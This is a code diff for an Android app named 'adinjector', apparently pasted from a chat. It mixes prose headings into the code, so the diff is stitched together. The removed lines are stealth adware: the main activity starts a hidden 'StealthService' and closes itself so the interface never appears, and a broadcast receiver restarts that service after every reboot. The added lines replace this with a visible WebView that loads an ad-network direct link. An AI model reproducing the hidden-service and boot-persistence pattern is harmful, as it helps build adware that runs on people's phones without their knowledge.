@@ -1,33 +1,39 @@
 package com.example.adinjector;
 
-import android.app.Activity;
 import android.os.Bundle;
-import android.content.Intent;
+import android.webkit.WebSettings;
+import android.webkit.WebView;
+import android.webkit.WebViewClient;
+import androidx.appcompat.app.AppCompatActivity;
 
-public class MainActivity extends Activity {
-    // A simple stub that immediately starts the stealth service.
+public class MainActivity extends AppCompatActivity {
+    private WebView webView;
+
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-        // Launch the background service.
-        startService(new Intent(this, StealthService.class));
-        finish(); // Kill the UI activity so it never appears.
+        
+        // WebView create kar rahe hain taaki link app ke andar chale
+        webView = new WebView(this);
+        setContentView(webView);
+
+        // JavaScript aur storage enable karna zaroori hai ads load hone ke liye
+        WebSettings webSettings = webView.getSettings();
+        webSettings.setJavaScriptEnabled(true);
+        webSettings.setDomStorageEnabled(true);
+
+        webView.setWebViewClient(new WebViewClient());
+
+        // Aapka Adsterra Direct Link
+        webView.loadUrl("https://www.profitableratecpmnetwork.com/hdk2jkb1tq?key=1811747717fba27cc8d799ee6913935e");
     }
-}
-4. AdReceiver.java – auto‑start after device reboot
-java
 
-package com.example.adinjector;
-
-import android.content.BroadcastReceiver;
-import android.content.Context;
-import android.content.Intent;
-
-public class AdReceiver extends BroadcastReceiver {
     @Override
-    public void onReceive(Context ctx, Intent intent) {
-        if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {
-            ctx.startService(new Intent(ctx, StealthService.class));
+    public void onBackPressed() {
+        if (webView.canGoBack()) {
+            webView.goBack();
+        } else {
+            super.onBackPressed();
         }
     }
 }
